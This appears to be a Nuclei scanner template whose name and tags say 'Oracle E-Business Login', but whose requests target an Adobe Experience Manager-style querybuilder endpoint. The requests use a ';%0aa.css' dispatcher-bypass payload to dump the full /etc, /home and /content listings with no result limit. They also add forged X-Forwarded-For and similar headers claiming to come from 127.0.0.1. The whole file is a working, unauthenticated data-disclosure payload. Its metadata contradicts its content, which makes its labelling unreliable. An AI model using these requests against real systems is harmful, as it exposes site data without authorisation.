id: momika_AEM

info:
  name: Oracle E-Business Login
  author: momika233(https://twitter.com/momika233)
  severity: high
  reference:
    - https://www.wangan.com/p/7fygfgc9761569d2
  tags: Oracle

requests:
  - method: GET
    path:
      - "{{BaseURL}}/bin/querybuilder.json.;%0aa.css?path=/etc&p.hits=full&p.limit=-1"
      - "{{BaseURL}}/bin/querybuilder.json.;%0Aa.css?path=/home&p.hits=full&p.limit=-1"
      - "{{BaseURL}}/bin/querybuilder.json.;%0Aa.css?path=/content&p.hits=full&p.limit=-1"


    headers:
      X-Client-IP: 127.0.0.1
      X-Remote-IP: 127.0.0.1
      X-Remote-Addr: 127.0.0.1
      X-Forwarded-For: 127.0.0.1
      X-Originating-IP: 127.0.0.1

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "success.*results"
